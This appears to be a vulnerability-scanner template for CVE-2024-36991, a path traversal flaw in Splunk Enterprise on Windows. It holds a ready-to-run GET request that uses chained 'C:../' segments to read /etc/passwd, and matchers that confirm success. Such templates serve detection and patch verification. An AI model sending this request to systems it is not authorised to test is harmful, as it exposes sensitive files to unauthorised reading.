id: CVE-2024-36991

info:
  name: Splunk Enterprise Path Traversal
  author: sardine web
  severity: high
  description: Path traversal vulnerability in Splunk Enterprise on Windows versions below 9.2.2, 9.1.5, and 9.0.10 that allows reading sensitive files.
  reference:
    - 
    - https://twitter.com/sardine_web

requests:
  - method: GET
    path:
      - "{{BaseURL}}/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate, br
      Connection: keep-alive
      Upgrade-Insecure-Requests: 1

    matchers:
      - type: word
        words:
          - "root:x:0:0:root:/root:/bin/bash"  # Typical content found in /etc/passwd file
          - "admin:"

      - type: status
        status:
          - 200
